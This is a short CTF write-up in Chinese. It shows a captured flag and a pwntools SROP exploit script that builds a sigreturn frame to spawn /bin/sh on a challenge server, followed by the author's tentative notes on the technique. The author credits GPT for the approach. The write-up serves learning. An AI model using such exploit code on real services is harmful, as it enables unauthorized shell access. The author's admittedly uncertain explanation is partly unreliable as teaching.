$ cat flag
flag{034d841e4f934b968ba94842e396a235}
$
```

>这个确实是可以利用不过有些地方微改即可
>

```
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote("challenge.qsnctf.com", 31225)

syscall_addr = 0x401045
binsh_addr = 0x40203A
pop_rax_ret = 0x40104A

frame = SigreturnFrame(kernel='amd64')
frame.rax = 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b"A"*8 + p64(pop_rax_ret) + p64(15) + p64(syscall_addr) + bytes(frame)
io.send(payload)  # 确保 rax=15

io.interactive()
```

>只能学习改一下gtp的方案，首先是需要被填充覆盖的貌似是8个字节之前测的，接着是找到rax的地址，主要是控制rdi，在SROP（Sigreturn Oriented Programming）攻击中，控制输入长度为15字节的核心目的是​​精确设置rax寄存器的值为15（即SYS_rt_sigreturn系统调用号）​​，从而触发sigreturn系统调用以恢复伪造的Signal Frame，然后找到syscall_addr地址，binsh_addr地址构造frame进行payload拼接。
>
>还是理解不到位如果有大佬能给我详细解释欢迎来批判我
>

